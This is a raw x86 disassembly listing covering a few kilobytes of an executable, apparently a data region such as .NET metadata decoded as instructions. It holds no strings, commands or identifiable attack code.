  405cde:	45                   	inc    %ebp
  405cdf:	1e                   	push   %ds
  405ce0:	06                   	push   %es
  405ce1:	00 f6                	add    %dh,%dh
  405ce3:	19 8f 05 0a 00 6f    	sbb    %ecx,0x6f000a05(%edi)
  405ce9:	0e                   	push   %cs
  405cea:	45                   	inc    %ebp
  405ceb:	1e                   	push   %ds
  405cec:	06                   	push   %es
  405ced:	00 33                	add    %dh,(%ebx)
  405cef:	26 30 00             	xor    %al,%es:(%eax)
  405cf2:	16                   	push   %ss
  405cf3:	00 89 1f 75 0a 06    	add    %cl,0x60a751f(%ecx)
  405cf9:	00 00                	add    %al,(%eax)
  405cfb:	16                   	push   %ss
  405cfc:	30 00                	xor    %al,(%eax)
  405cfe:	06                   	push   %es
  405cff:	00 21                	add    %ah,(%ecx)
  405d01:	0e                   	push   %cs
  405d02:	8f 05 06 00 36 17    	pop    0x17360006
  405d08:	8f 05 06 00 10 0d    	pop    0xd100006
  405d0e:	8f 05 06 00 f6 1c    	pop    0x1cf60006
  405d14:	8f 05 06 00 ec 19    	pop    0x19ec0006
  405d1a:	8f 05 16 00 05 1a    	pop    0x1a050016
  405d20:	58                   	pop    %eax
  405d21:	1e                   	push   %ds
  405d22:	1a 00                	sbb    (%eax),%al
  405d24:	9c                   	pushf
  405d25:	1c 59                	sbb    $0x59,%al
  405d27:	22 1a                	and    (%edx),%bl
  405d29:	00 37                	add    %dh,(%edi)
  405d2b:	19 59 22             	sbb    %ebx,0x22(%ecx)
  405d2e:	8b 01                	mov    (%ecx),%eax
  405d30:	39 1d 00 00 1a 00    	cmp    %ebx,0x1a0000
  405d36:	41                   	inc    %ecx
  405d37:	21 59 22             	and    %ebx,0x22(%ecx)
  405d3a:	06                   	push   %es
  405d3b:	00 c0                	add    %al,%al
  405d3d:	1d a9 17 06 00       	sbb    $0x617a9,%eax
  405d42:	4b                   	dec    %ebx
  405d43:	00 a9 17 06 00 a0    	add    %ch,-0x5ffff9e9(%ecx)
  405d49:	17                   	pop    %ss
  405d4a:	a9 17 06 00 6d       	test   $0x6d000617,%eax
  405d4f:	00 a9 17 06 00 e3    	add    %ch,-0x1cfff9e9(%ecx)
  405d55:	1b d8                	sbb    %eax,%ebx
  405d57:	25 06 00 d7 17       	and    $0x17d70006,%eax
  405d5c:	d8 25 06 00 08 0f    	fsubs  0xf080006
  405d62:	a9 17 06 00 40       	test   $0x40000617,%eax
  405d67:	18 a9 17 1e 00 e0    	sbb    %ch,-0x1fffe1e9(%ecx)
  405d6d:	18 e7                	sbb    %ah,%bh
  405d6f:	1f                   	pop    %ds
  405d70:	06                   	push   %es
  405d71:	00 6a 26             	add    %ch,0x26(%edx)
  405d74:	a0 16 06 00 ba       	mov    0xba000616,%al
  405d79:	16                   	push   %ss
  405d7a:	a0 16 06 00 2f       	mov    0x2f000616,%al
  405d7f:	0e                   	push   %cs
  405d80:	a0 16 06 00 7f       	mov    0x7f000616,%al
  405d85:	0b a9 17 06 00 0d    	or     0xd000617(%ecx),%ebp
  405d8b:	0e                   	push   %cs
  405d8c:	10 13                	adc    %dl,(%ebx)
  405d8e:	0a 00                	or     (%eax),%al
  405d90:	b5 1c                	mov    $0x1c,%ch
  405d92:	30 00                	xor    %al,(%eax)
  405d94:	0a 00                	or     (%eax),%al
  405d96:	b5 20                	mov    $0x20,%ch
  405d98:	30 00                	xor    %al,(%eax)
  405d9a:	06                   	push   %es
  405d9b:	00 ad 0c 30 00 43    	add    %ch,0x4300300c(%ebp)
  405da1:	00 76 1d             	add    %dh,0x1d(%esi)
  405da4:	00 00                	add    %al,(%eax)
  405da6:	12 00                	adc    (%eax),%al
  405da8:	9b                   	fwait
  405da9:	0d 6c 1b 06 00       	or     $0x61b6c,%eax
  405dae:	0b 00                	or     (%eax),%eax
  405db0:	5a                   	pop    %edx
  405db1:	0a 06                	or     (%esi),%al
  405db3:	00 7f 18             	add    %bh,0x18(%edi)
  405db6:	a9 17 06 00 f5       	test   $0xf5000617,%eax
  405dbb:	25 0b 19 06 00       	and    $0x6190b,%eax
  405dc0:	8b 0f                	mov    (%edi),%ecx
  405dc2:	a9 17 06 00 81       	test   $0x81000617,%eax
  405dc7:	1d a9 17 06 00       	sbb    $0x617a9,%eax
  405dcc:	e9 0d a9 17 22       	jmp    0x225806de
  405dd1:	00 12                	add    %dl,(%edx)
  405dd3:	1a 3c 1c             	sbb    (%esp,%ebx,1),%bh
  405dd6:	22 00                	and    (%eax),%al
  405dd8:	5f                   	pop    %edi
  405dd9:	1f                   	pop    %ds
  405dda:	3c 1c                	cmp    $0x1c,%al
  405ddc:	22 00                	and    (%eax),%al
  405dde:	63 1c 3c             	arpl   %ebx,(%esp,%edi,1)
  405de1:	1c 12                	sbb    $0x12,%al
  405de3:	00 5b 1c             	add    %bl,0x1c(%ebx)
  405de6:	95                   	xchg   %eax,%ebp
  405de7:	1e                   	push   %ds
  405de8:	22 00                	and    (%eax),%al
  405dea:	77 1f                	ja     0x405e0b
  405dec:	3c 1c                	cmp    $0x1c,%al
  405dee:	06                   	push   %es
  405def:	00 2b                	add    %ch,(%ebx)
  405df1:	1f                   	pop    %ds
  405df2:	d8 25 06 00 8c 19    	fsubs  0x198c0006
  405df8:	a9 17 06 00 32       	test   $0x32000617,%eax
  405dfd:	1f                   	pop    %ds
  405dfe:	d8 25 12 00 15 1c    	fsubs  0x1c150012
  405e04:	d8 25 06 00 59 17    	fsubs  0x17590006
  405e0a:	d8 25 06 00 84 00    	fsubs  0x840006
  405e10:	d8 25 06 00 76 19    	fsubs  0x19760006
  405e16:	a9 17 06 00 b0       	test   $0xb0000617,%eax
  405e1b:	17                   	pop    %ss
  405e1c:	d8 25 06 00 55 0d    	fsubs  0xd550006
  405e22:	d8 25 06 00 19 0d    	fsubs  0xd190006
  405e28:	d8 25 06 00 1a 18    	fsubs  0x181a0006
  405e2e:	d8 25 06 00 34 0d    	fsubs  0xd340006
  405e34:	d8 25 06 00 5f 19    	fsubs  0x195f0006
  405e3a:	d8 25 06 00 79 1c    	fsubs  0x1c790006
  405e40:	a9 17 06 00 75       	test   $0x75000617,%eax
  405e45:	25 a9 17 06 00       	and    $0x617a9,%eax
  405e4a:	4e                   	dec    %esi
  405e4b:	20 95 1e 06 00 c6    	and    %dl,-0x39fff9e2(%ebp)
  405e51:	0d a9 17 06 00       	or     $0x617a9,%eax
  405e56:	3f                   	aas
  405e57:	0b d8                	or     %eax,%ebx
  405e59:	25 06 00 64 00       	and    $0x640006,%eax
  405e5e:	a9 17 06 00 b4       	test   $0xb4000617,%eax
  405e63:	0d a9 17 06 00       	or     $0x617a9,%eax
  405e68:	1a 0e                	sbb    (%esi),%cl
  405e6a:	a9 17 06 00 6d       	test   $0x6d000617,%eax
  405e6f:	20 8f 05 06 00 90    	and    %cl,-0x6ffff9fb(%edi)
  405e75:	0f 8f 05 0a 00 66    	jg     0x66406880
  405e7b:	17                   	pop    %ss
  405e7c:	ca 18 0a             	lret   $0xa18
  405e7f:	00 45 0d             	add    %al,0xd(%ebp)
  405e82:	ca 18 00             	lret   $0x18
  405e85:	00 00                	add    %al,(%eax)
  405e87:	00 98 00 00 00 00    	add    %bl,0x0(%eax)
  405e8d:	00 01                	add    %al,(%ecx)
  405e8f:	00 01                	add    %al,(%ecx)
  405e91:	00 01                	add    %al,(%ecx)
  405e93:	00 10                	add    %dl,(%eax)
  405e95:	00 73 04             	add    %dh,0x4(%ebx)
  405e98:	32 04 05 00 01 00 01 	xor    0x1000100(,%eax,1),%al
  405e9f:	00 81 01 10 00 bd    	add    %al,-0x42ffefff(%ecx)
  405ea5:	25 32 04 05 00       	and    $0x50432,%eax
  405eaa:	01 00                	add    %eax,(%eax)
  405eac:	03 00                	add    (%eax),%eax
  405eae:	81 01 10 00 5a 09    	addl   $0x95a0010,(%ecx)
  405eb4:	36 1a 05 00 13 00 06 	sbb    %ss:0x6001300,%al
  405ebb:	00 00                	add    %al,(%eax)
  405ebd:	00 10                	add    %dl,(%eax)
  405ebf:	00 b4 0f 18 0a 05 00 	add    %dh,0x50a18(%edi,%ecx,1)
  405ec6:	1e                   	push   %ds
  405ec7:	00 24 00             	add    %ah,(%eax,%eax,1)
  405eca:	00 00                	add    %al,(%eax)
  405ecc:	10 00                	adc    %al,(%eax)
  405ece:	59                   	pop    %ecx
  405ecf:	1a dc                	sbb    %ah,%bl
  405ed1:	05 05 00 1e 00       	add    $0x1e0005,%eax
  405ed6:	26 00 81 01 10 00 d8 	add    %al,%es:-0x27ffefff(%ecx)
  405edd:	1a dc                	sbb    %ah,%bl
  405edf:	05 05 00 1e 00       	add    $0x1e0005,%eax
  405ee4:	2d 00 81 01 10       	sub    $0x10018100,%eax
  405ee9:	00 1c 1d dc 05 05 00 	add    %bl,0x505dc(,%ebx,1)
  405ef0:	1e                   	push   %ds
  405ef1:	00 2f                	add    %ch,(%edi)
  405ef3:	00 81 01 10 00 d9    	add    %al,-0x26ffefff(%ecx)
  405ef9:	1f                   	pop    %ds
  405efa:	dc 05 05 00 1e 00    	faddl  0x1e0005
  405f00:	30 00                	xor    %al,(%eax)
  405f02:	81 01 10 00 9e 12    	addl   $0x129e0010,(%ecx)
  405f08:	dc 05 05 00 1e 00    	faddl  0x1e0005
  405f0e:	36 00 81 01 10 00 1d 	add    %al,%ss:0x1d001001(%ecx)
  405f15:	17                   	pop    %ss
  405f16:	dc 05 05 00 1f 00    	faddl  0x1f0005
  405f1c:	38 00                	cmp    %al,(%eax)
  405f1e:	02 01                	add    (%ecx),%al
  405f20:	00 00                	add    %al,(%eax)
  405f22:	f3 20 00             	repz and %al,(%eax)
  405f25:	00 39                	add    %bh,(%ecx)
  405f27:	00 1f                	add    %bl,(%edi)
  405f29:	00 3e                	add    %bh,(%esi)
  405f2b:	00 81 01 10 00 0a    	add    %al,0xa001001(%ecx)
  405f31:	21 dc                	and    %ebx,%esp
  405f33:	05 05 00 23 00       	add    $0x230005,%eax
  405f38:	3e 00 81 01 10 00 c9 	add    %al,%ds:-0x36ffefff(%ecx)
  405f3f:	20 dc                	and    %bl,%ah
  405f41:	05 05 00 23 00       	add    $0x230005,%eax
  405f46:	41                   	inc    %ecx
  405f47:	00 81 01 10 00 b9    	add    %al,-0x46ffefff(%ecx)
  405f4d:	23 ad 01 05 00 24    	and    0x24000501(%ebp),%ebp
  405f53:	00 46 00             	add    %al,0x0(%esi)
  405f56:	83 01 10             	addl   $0x10,(%ecx)
  405f59:	00 cc                	add    %cl,%ah
  405f5b:	05 00 00 05 00       	add    $0x50000,%eax
  405f60:	25 00 4b 00 01       	and    $0x1004b00,%eax
  405f65:	00 10                	add    %dl,(%eax)
  405f67:	00 bb 00 24 0a 05    	add    %bh,0x50a2400(%ebx)
  405f6d:	00 26                	add    %ah,(%esi)
  405f6f:	00 4b 00             	add    %cl,0x0(%ebx)
  405f72:	81 01 10 00 1b 16    	addl   $0x161b0010,(%ecx)
  405f78:	24 0a                	and    $0xa,%al
  405f7a:	05 00 2d 00 52       	add    $0x52002d00,%eax
  405f7f:	00 00                	add    %al,(%eax)
  405f81:	01 00                	add    %eax,(%eax)
  405f83:	00 ea                	add    %ch,%dl
  405f85:	17                   	pop    %ss
  405f86:	00 00                	add    %al,(%eax)
  405f88:	05 00 2d 00 54       	add    $0x54002d00,%eax
  405f8d:	00 13                	add    %dl,(%ebx)
  405f8f:	01 00                	add    %eax,(%eax)
  405f91:	00 a2 01 00 00 51    	add    %ah,0x51000001(%edx)
  405f97:	00 2e                	add    %ch,(%esi)
  405f99:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  405f9d:	00 10                	add    %dl,(%eax)
  405f9f:	00 77 12             	add    %dh,0x12(%edi)
  405fa2:	f0 02 05 00 2e 00 54 	lock add 0x54002e00,%al
  405fa9:	00 01                	add    %al,(%ecx)
  405fab:	00 10                	add    %dl,(%eax)
  405fad:	00 e4                	add    %ah,%ah
  405faf:	02 f0                	add    %al,%dh
  405fb1:	02 05 00 2f 00 5f    	add    0x5f002f00,%al
  405fb7:	00 01                	add    %al,(%ecx)
  405fb9:	00 10                	add    %dl,(%eax)
  405fbb:	00 e4                	add    %ah,%ah
  405fbd:	23 f0                	and    %eax,%esi
  405fbf:	02 05 00 31 00 63    	add    0x63003100,%al
  405fc5:	00 01                	add    %al,(%ecx)
  405fc7:	00 10                	add    %dl,(%eax)
  405fc9:	00 9f 03 f0 02 05    	add    %bl,0x502f003(%edi)
  405fcf:	00 33                	add    %dh,(%ebx)
  405fd1:	00 6a 00             	add    %ch,0x0(%edx)
  405fd4:	01 01                	add    %eax,(%ecx)
  405fd6:	00 00                	add    %al,(%eax)
  405fd8:	27                   	daa
  405fd9:	09 f0                	or     %esi,%eax
  405fdb:	02 39                	add    (%ecx),%bh
  405fdd:	00 3a                	add    %bh,(%edx)
  405fdf:	00 95 00 00 00 10    	add    %dl,0x10000000(%ebp)
  405fe5:	00 ce                	add    %cl,%dh
  405fe7:	04 f0                	add    $0xf0,%al
  405fe9:	02 05 00 47 00 95    	add    0x95004700,%al
  405fef:	00 00                	add    %al,(%eax)
  405ff1:	00 10                	add    %dl,(%eax)
  405ff3:	00 21                	add    %ah,(%ecx)
  405ff5:	1b f0                	sbb    %eax,%esi
  405ff7:	02 05 00 47 00 99    	add    0x99004700,%al
  405ffd:	00 81 01 10 00 e5    	add    %al,-0x1affefff(%ecx)
  406003:	16                   	push   %ss
  406004:	f0 02 05 00 47 00 a2 	lock add 0xa2004700,%al
  40600b:	00 00                	add    %al,(%eax)
  40600d:	01 00                	add    %eax,(%eax)
  40600f:	00 d0                	add    %dl,%al
  406011:	21 00                	and    %eax,(%eax)
  406013:	00 05 00 47 00 a4    	add    %al,0xa4004700
  406019:	00 13                	add    %dl,(%ebx)
  40601b:	01 00                	add    %eax,(%eax)
  40601d:	00 e1                	add    %ah,%cl
  40601f:	03 00                	add    (%eax),%eax
  406021:	00 51 00             	add    %dl,0x0(%ecx)
  406024:	48                   	dec    %eax
  406025:	00 a4 00 16 00 35 14 	add    %ah,0x14350016(%eax,%eax,1)
  40602c:	12 00                	adc    (%eax),%al
  40602e:	16                   	push   %ss
  40602f:	00 c1                	add    %al,%cl
  406031:	0a 12                	or     (%edx),%dl
  406033:	00 16                	add    %dl,(%esi)
  406035:	00 45 15             	add    %al,0x15(%ebp)
  406038:	12 00                	adc    (%eax),%al
  40603a:	16                   	push   %ss
  40603b:	00 f3                	add    %dh,%bl
  40603d:	00 12                	add    %dl,(%edx)
  40603f:	00 16                	add    %dl,(%esi)
  406041:	00 40 04             	add    %al,0x4(%eax)
  406044:	12 00                	adc    (%eax),%al
  406046:	16                   	push   %ss
  406047:	00 b3 07 12 00 16    	add    %dh,0x16001207(%ebx)
  40604d:	00 9e 19 12 00 16    	add    %bl,0x16001219(%esi)
  406053:	00 5c 16 12          	add    %bl,0x12(%esi,%edx,1)
  406057:	00 16                	add    %dl,(%esi)
  406059:	00 2c 07             	add    %ch,(%edi,%eax,1)
  40605c:	12 00                	adc    (%eax),%al
  40605e:	16                   	push   %ss
  40605f:	00 ee                	add    %ch,%dh
  406061:	14 12                	adc    $0x12,%al
  406063:	00 16                	add    %dl,(%esi)
  406065:	00 f8                	add    %bh,%al
  406067:	04 15                	add    $0x15,%al
  406069:	00 16                	add    %dl,(%esi)
  40606b:	00 00                	add    %al,(%eax)
  40606d:	1b 12                	sbb    (%edx),%edx
  40606f:	00 16                	add    %dl,(%esi)
  406071:	00 46 05             	add    %al,0x5(%esi)
  406074:	19 00                	sbb    %eax,(%eax)
  406076:	16                   	push   %ss
  406077:	00 48 18             	add    %cl,0x18(%eax)
  40607a:	12 00                	adc    (%eax),%al
  40607c:	16                   	push   %ss
  40607d:	00 65 02             	add    %ah,0x2(%ebp)
  406080:	12 00                	adc    (%eax),%al
  406082:	16                   	push   %ss
  406083:	00 e8                	add    %ch,%al
  406085:	01 12                	add    %edx,(%edx)
  406087:	00 16                	add    %dl,(%esi)
  406089:	00 c1                	add    %al,%cl
  40608b:	05 12 00 16 00       	add    $0x160012,%eax
  406090:	83 24 12 00          	andl   $0x0,(%edx,%edx,1)
  406094:	11 00                	adc    %eax,(%eax)
  406096:	8b 0c 21             	mov    (%ecx,%eiz,1),%ecx
  406099:	00 11                	add    %dl,(%ecx)
  40609b:	00 70 0c             	add    %dh,0xc(%eax)
  40609e:	25 00 11 00 40       	and    $0x40001100,%eax
  4060a3:	0c 29                	or     $0x29,%al
  4060a5:	00 11                	add    %dl,(%ecx)
  4060a7:	00 d6                	add    %dl,%dh
  4060a9:	0b 2d 00 11 00 58    	or     0x58001100,%ebp
  4060af:	0c 2d                	or     $0x2d,%al
  4060b1:	00 11                	add    %dl,(%ecx)
  4060b3:	00 bb 0b 30 00 11    	add    %bh,0x1100300b(%ebx)
  4060b9:	00 9e 0b 34 00 31    	add    %bl,0x3100340b(%esi)
  4060bf:	00 84 0b 37 00 11 00 	add    %al,0x110037(%ebx,%ecx,1)
  4060c6:	f2 0b 30             	repnz or (%eax),%esi
  4060c9:	00 11                	add    %dl,(%ecx)
  4060cb:	00 26                	add    %ah,(%esi)
  4060cd:	0c 3a                	or     $0x3a,%al
  4060cf:	00 11                	add    %dl,(%ecx)
  4060d1:	00 08                	add    %cl,(%eax)
  4060d3:	0c 34                	or     $0x34,%al
  4060d5:	00 16                	add    %dl,(%esi)
  4060d7:	00 a1 04 dc 00 06    	add    %ah,0x600dc04(%ecx)
  4060dd:	06                   	push   %es
  4060de:	52                   	push   %edx
  4060df:	09 06                	or     %eax,(%esi)
  4060e1:	01 56 80             	add    %edx,-0x80(%esi)
  4060e4:	b9 24 09 01 56       	mov    $0x56010924,%ecx
  4060e9:	80 7b 01 09          	cmpb   $0x9,0x1(%ebx)
  4060ed:	01 56 80             	add    %edx,-0x80(%esi)
  4060f0:	48                   	dec    %eax
  4060f1:	25 09 01 31 00       	and    $0x310109,%eax
  4060f6:	d7                   	xlat   %ds:(%ebx)
  4060f7:	00 12                	add    %dl,(%edx)
  4060f9:	00 16                	add    %dl,(%esi)
  4060fb:	00 80 02 30 01 16    	add    %al,0x16013002(%eax)
  406101:	00 95 26 43 01 51    	add    %dl,0x51014326(%ebp)
  406107:	80 b2 05 3a 00 51 80 	xorb   $0x80,0x51003a05(%edx)
  40610e:	49                   	dec    %ecx
  40610f:	23 3a                	and    (%edx),%edi
  406111:	00 51 80             	add    %dl,-0x80(%ecx)
  406114:	d7                   	xlat   %ds:(%ebx)
  406115:	0c 3a                	or     $0x3a,%al
  406117:	00 51 80             	add    %dl,-0x80(%ecx)
  40611a:	9c                   	pushf
  40611b:	06                   	push   %es
  40611c:	3a 00                	cmp    (%eax),%al
  40611e:	21 00                	and    %eax,(%eax)
  406120:	76 08                	jbe    0x40612a
  406122:	29 00                	sub    %eax,(%eax)
  406124:	21 00                	and    %eax,(%eax)
  406126:	53                   	push   %ebx
  406127:	15 29 00 31 00       	adc    $0x310029,%eax
  40612c:	bf 0c 29 00 33       	mov    $0x3300290c,%edi
  406131:	01 ad 19 8b 01 11    	add    %ebp,0x11018b19(%ebp)
  406137:	00 10                	add    %dl,(%eax)
  406139:	08 8f 01 01 00 04    	or     %cl,0x4000101(%edi)
  40613f:	01 30                	add    %esi,(%eax)
  406141:	01 01                	add    %eax,(%ecx)
  406143:	00 c7                	add    %al,%bh
  406145:	23 3a                	and    (%edx),%edi
  406147:	00 01                	add    %al,(%ecx)
  406149:	00 04 01             	add    %al,(%ecx,%eax,1)
  40614c:	30 01                	xor    %al,(%ecx)
  40614e:	01 00                	add    %eax,(%eax)
  406150:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406151:	1a c7                	sbb    %bh,%al
  406153:	01 01                	add    %eax,(%ecx)
  406155:	00 33                	add    %dh,(%ebx)
  406157:	03 12                	add    (%edx),%edx
  406159:	00 01                	add    %al,(%ecx)
  40615b:	00 c0                	add    %al,%al
  40615d:	04 12                	add    $0x12,%al
  40615f:	00 01                	add    %al,(%ecx)
  406161:	00 f4                	add    %dh,%ah
  406163:	09 37                	or     %esi,(%edi)
  406165:	00 01                	add    %al,(%ecx)
  406167:	00 a8 06 02 02 01    	add    %ch,0x1020206(%eax)
  40616d:	00 48 02             	add    %cl,0x2(%eax)
  406170:	c7 01 01 00 04 01    	movl   $0x1040001,(%ecx)
  406176:	30 01                	xor    %al,(%ecx)
  406178:	01 00                	add    %eax,(%eax)
  40617a:	cd 02                	int    $0x2
  40617c:	06                   	push   %es
  40617d:	02 06                	add    (%esi),%al
  40617f:	06                   	push   %es
  406180:	52                   	push   %edx
  406181:	09 3a                	or     %edi,(%edx)
  406183:	00 56 80             	add    %dl,-0x80(%esi)
  406186:	09 06                	or     %eax,(%esi)
  406188:	02 02                	add    (%edx),%al
  40618a:	56                   	push   %esi
  40618b:	80 d3 12             	adc    $0x12,%bl
  40618e:	02 02                	add    (%edx),%al
  406190:	56                   	push   %esi
  406191:	80 d4 1d             	adc    $0x1d,%ah
  406194:	02 02                	add    (%edx),%al
  406196:	56                   	push   %esi
  406197:	80 3c 1b 02          	cmpb   $0x2,(%ebx,%ebx,1)
  40619b:	02 56 80             	add    -0x80(%esi),%dl
  40619e:	f2 08 02             	repnz or %al,(%edx)
  4061a1:	02 56 80             	add    -0x80(%esi),%dl
  4061a4:	3c 01                	cmp    $0x1,%al
  4061a6:	02 02                	add    (%edx),%al
  4061a8:	56                   	push   %esi
  4061a9:	80 c7 1d             	add    $0x1d,%bh
  4061ac:	02 02                	add    (%edx),%al
  4061ae:	56                   	push   %esi
  4061af:	80 71 07 02          	xorb   $0x2,0x7(%ecx)
  4061b3:	02 56 80             	add    -0x80(%esi),%dl
  4061b6:	bb 12 02 02 56       	mov    $0x56020212,%ebx
  4061bb:	80 78 1b 02          	cmpb   $0x2,0x1b(%eax)
  4061bf:	02 56 80             	add    -0x80(%esi),%dl
  4061c2:	73 1a                	jae    0x4061de
  4061c4:	02 02                	add    (%edx),%al
  4061c6:	56                   	push   %esi
  4061c7:	80 4b 06 02          	orb    $0x2,0x6(%ebx)
  4061cb:	02 33                	add    (%ebx),%dh
  4061cd:	01 4a 24             	add    %ecx,0x24(%edx)
  4061d0:	fd                   	std
  4061d1:	02 08                	add    (%eax),%cl
  4061d3:	26 00 00             	add    %al,%es:(%eax)
  4061d6:	00 00                	add    %al,(%eax)
  4061d8:	96                   	xchg   %eax,%esi
  4061d9:	00 70 18             	add    %dh,0x18(%eax)
  4061dc:	0a 00                	or     (%eax),%al
  4061de:	01 00                	add    %eax,(%eax)
  4061e0:	78 20                	js     0x406202
  4061e2:	00 00                	add    %al,(%eax)
  4061e4:	00 00                	add    %al,(%eax)
  4061e6:	86 18                	xchg   %bl,(%eax)
  4061e8:	8b 1d 0e 00 01 00    	mov    0x1000e,%ebx
  4061ee:	f8                   	clc
  4061ef:	26 00 00             	add    %al,%es:(%eax)
  4061f2:	00 00                	add    %al,(%eax)
  4061f4:	96                   	xchg   %eax,%esi
  4061f5:	00 0e                	add    %cl,(%esi)
  4061f7:	04 1d                	add    $0x1d,%al
  4061f9:	00 01                	add    %al,(%ecx)
  4061fb:	00 50 28             	add    %dl,0x28(%eax)
  4061fe:	00 00                	add    %al,(%eax)
  406200:	00 00                	add    %al,(%eax)
  406202:	91                   	xchg   %eax,%ecx
  406203:	00 58 06             	add    %bl,0x6(%eax)
  406206:	1d 00 01 00 c0       	sbb    $0xc0000100,%eax
  40620b:	28 00                	sub    %al,(%eax)
  40620d:	00 00                	add    %al,(%eax)
  40620f:	00 91 18 91 1d 0a    	add    %dl,0xa1d9118(%ecx)
  406215:	00 01                	add    %al,(%ecx)
  406217:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  40621d:	00 96 08 28 22 3d    	add    %dl,0x3d222808(%esi)
  406223:	00 01                	add    %al,(%ecx)
  406225:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  40622b:	00 96 08 36 22 42    	add    %dl,0x42223608(%esi)
  406231:	00 01                	add    %al,(%ecx)
  406233:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  406239:	00 96 08 0c 22 48    	add    %dl,0x48220c08(%esi)
  40623f:	00 02                	add    %al,(%edx)
  406241:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  406247:	00 96 08 1a 22 4d    	add    %dl,0x4d221a08(%esi)
  40624d:	00 02                	add    %al,(%edx)
  40624f:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  406255:	00 91 08 6a 1c 53    	add    %dl,0x531c6a08(%ecx)
  40625b:	00 03                	add    %al,(%ebx)
  40625d:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  406263:	00 91 08 75 1c 58    	add    %dl,0x581c7508(%ecx)
  406269:	00 03                	add    %al,(%ebx)
  40626b:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  406271:	00 91 08 24 12 5e    	add    %dl,0x5e122408(%ecx)
  406277:	00 04 00             	add    %al,(%eax,%eax,1)
  40627a:	b4 20                	mov    $0x20,%ah
  40627c:	00 00                	add    %al,(%eax)
  40627e:	00 00                	add    %al,(%eax)
  406280:	91                   	xchg   %eax,%ecx
  406281:	08 33                	or     %dh,(%ebx)
  406283:	12 62 00             	adc    0x0(%edx),%ah
  406286:	04 00                	add    $0x0,%al
  406288:	bc 20 00 00 00       	mov    $0x20,%esp
  40628d:	00 91 08 b4 21 5e    	add    %dl,0x5e21b408(%ecx)
  406293:	00 05 00 c3 20 00    	add    %al,0x20c300
  406299:	00 00                	add    %al,(%eax)
  40629b:	00 91 08 bf 21 62    	add    %dl,0x6221bf08(%ecx)
  4062a1:	00 05 00 cb 20 00    	add    %al,0x20cb00
  4062a7:	00 00                	add    %al,(%eax)
  4062a9:	00 91 08 e5 11 67    	add    %dl,0x6711e508(%ecx)
  4062af:	00 06                	add    %al,(%esi)
  4062b1:	00 d2                	add    %dl,%dl
  4062b3:	20 00                	and    %al,(%eax)
  4062b5:	00 00                	add    %al,(%eax)
  4062b7:	00 91 08 f3 11 6c    	add    %dl,0x6c11f308(%ecx)
  4062bd:	00 06                	add    %al,(%esi)
  4062bf:	00 da                	add    %bl,%dl
  4062c1:	20 00                	and    %al,(%eax)
  4062c3:	00 00                	add    %al,(%eax)
  4062c5:	00 96 08 5b 0b 1d    	add    %dl,0x1d0b5b08(%esi)
  4062cb:	00 07                	add    %al,(%edi)
  4062cd:	00 e1                	add    %ah,%cl
  4062cf:	20 00                	and    %al,(%eax)
  4062d1:	00 00                	add    %al,(%eax)
  4062d3:	00 96 08 6b 0b 72    	add    %dl,0x720b6b08(%esi)
  4062d9:	00 07                	add    %al,(%edi)
  4062db:	00 e9                	add    %ch,%cl
  4062dd:	20 00                	and    %al,(%eax)
  4062df:	00 00                	add    %al,(%eax)
  4062e1:	00 91 08 8b 0a 77    	add    %dl,0x770a8b08(%ecx)
  4062e7:	00 08                	add    %cl,(%eax)
  4062e9:	00 f0                	add    %dh,%al
  4062eb:	20 00                	and    %al,(%eax)
  4062ed:	00 00                	add    %al,(%eax)
  4062ef:	00 91 08 fe 12 67    	add    %dl,0x6712fe08(%ecx)
  4062f5:	00 08                	add    %cl,(%eax)
  4062f7:	00 f7                	add    %dh,%bh
  4062f9:	20 00                	and    %al,(%eax)
  4062fb:	00 00                	add    %al,(%eax)
  4062fd:	00 91 08 07 13 6c    	add    %dl,0x6c130708(%ecx)
  406303:	00 08                	add    %cl,(%eax)
  406305:	00 ff                	add    %bh,%bh
  406307:	20 00                	and    %al,(%eax)
  406309:	00 00                	add    %al,(%eax)
  40630b:	00 96 08 cb 16 7b    	add    %dl,0x7b16cb08(%esi)
  406311:	00 09                	add    %cl,(%ecx)
  406313:	00 06                	add    %al,(%esi)
  406315:	21 00                	and    %eax,(%eax)
  406317:	00 00                	add    %al,(%eax)
  406319:	00 96 08 d8 16 7f    	add    %dl,0x7f16d808(%esi)
  40631f:	00 09                	add    %cl,(%ecx)
  406321:	00 0e                	add    %cl,(%esi)
  406323:	21 00                	and    %eax,(%eax)
  406325:	00 00                	add    %al,(%eax)
  406327:	00 96 08 f2 13 1d    	add    %dl,0x1d13f208(%esi)
  40632d:	00 0a                	add    %cl,(%edx)
  40632f:	00 15 21 00 00 00    	add    %dl,0x21
  406335:	00 96 08 03 14 72    	add    %dl,0x72140308(%esi)
  40633b:	00 0a                	add    %cl,(%edx)
  40633d:	00 6c 29 00          	add    %ch,0x0(%ecx,%ebp,1)
  406341:	00 00                	add    %al,(%eax)
  406343:	00 96 00 b2 1a 0a    	add    %dl,0xa1ab200(%esi)
  406349:	00 0b                	add    %cl,(%ebx)
  40634b:	00 1d 21 00 00 00    	add    %bl,0x21
  406351:	00 91 00 75 24 84    	add    %dl,-0x7bdb8b00(%ecx)
  406357:	00 0b                	add    %cl,(%ebx)
  406359:	00 28                	add    %ch,(%eax)
  40635b:	21 00                	and    %eax,(%eax)
  40635d:	00 00                	add    %al,(%eax)
  40635f:	00 91 00 ea 0a 89    	add    %dl,-0x76f51600(%ecx)
  406365:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406368:	b8 2c 00 00 00       	mov    $0x2c,%eax
  40636d:	00 96 00 9b 02 0a    	add    %dl,0xa029b00(%esi)
  406373:	00 10                	add    %dl,(%eax)
  406375:	00 40 2d             	add    %al,0x2d(%eax)
  406378:	00 00                	add    %al,(%eax)
  40637a:	00 00                	add    %al,(%eax)
  40637c:	96                   	xchg   %eax,%esi
  40637d:	00 f4                	add    %dh,%ah
  40637f:	01 94 00 10 00 24 2f 	add    %edx,0x2f240010(%eax,%eax,1)
  406386:	00 00                	add    %al,(%eax)
  406388:	00 00                	add    %al,(%eax)
  40638a:	96                   	xchg   %eax,%esi
  40638b:	00 2e                	add    %ch,(%esi)
